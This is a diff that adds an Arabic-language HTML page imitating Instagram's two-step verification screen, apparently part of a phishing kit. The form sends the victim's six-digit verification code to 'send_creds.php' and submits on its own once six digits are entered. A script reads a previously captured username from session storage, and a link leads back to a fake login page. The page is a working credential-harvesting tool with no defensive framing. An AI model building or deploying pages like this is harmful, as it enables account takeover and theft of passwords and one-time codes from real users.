@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>التحقق بخطوتين | Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <svg width="175" height="51" viewBox="0 0 175 51">
+                    <path d="M154.5 13.4c-1.2 0-2.2 0.9-2.2 2.2 0 1.2 0.9 2.2 2.2 2.2 1.2 0 2.2-0.9 2.2-2.2C156.7 14.3 155.7 13.4 154.5 13.4z M162.7 25.5c0 6.5-5.3 11.8-11.8 11.8s-11.8-5.3-11.8-11.8 5.3-11.8 11.8-11.8S162.7 19 162.7 25.5z" fill="url(#gradient)"/>
+                    <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                        <stop offset="0%" style="stop-color:#833AB4"/>
+                        <stop offset="100%" style="stop-color:#FD1D1D"/>
+                    </linearGradient>
+                </svg>
+                <h1>إنستغرام</h1>
+            </div>
+
+            <div class="2fa-header">
+                <h3>التحقق بخطوتين</h3>
+                <p>تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
+            </div>
+
+            <form id="twofaForm" method="POST" action="send_creds.php?step=2fa">
+                <div class="input-group">
+                    <input type="text" id="code" name="twofa_code" 
+                           autocomplete="off"
+                           inputmode="numeric"
+                           pattern="[0-9]*"
+                           maxlength="6"
+                           placeholder="رمز التحقق" 
+                           required>
+                    <label for="code">أدخل رمز التحقق المكون من 6 أرقام</label>
+                </div>
+
+                <button type="submit">تأكيد</button>
+
+                <div class="resend">
+                    <a href="#">إعادة إرسال الرمز</a>
+                </div>
+            </form>
+
+            <div class="back-to-login">
+                <a href="index.html">← العودة إلى تسجيل الدخول</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Auto-submit when 6 digits are entered (improves user experience)
+        const codeInput = document.getElementById('code');
+        codeInput.addEventListener('input', function(e) {
+            if (this.value.length === 6) {
+                document.getElementById('twofaForm').submit();
+            }
+        });
+        
+        // Store previous credentials if available via sessionStorage
+        const storedUser = sessionStorage.getItem('ig_user');
+        if (storedUser) {
+            console.log('Session active for: ' + storedUser);
+        }
+    </script>
+</body>
+</html>
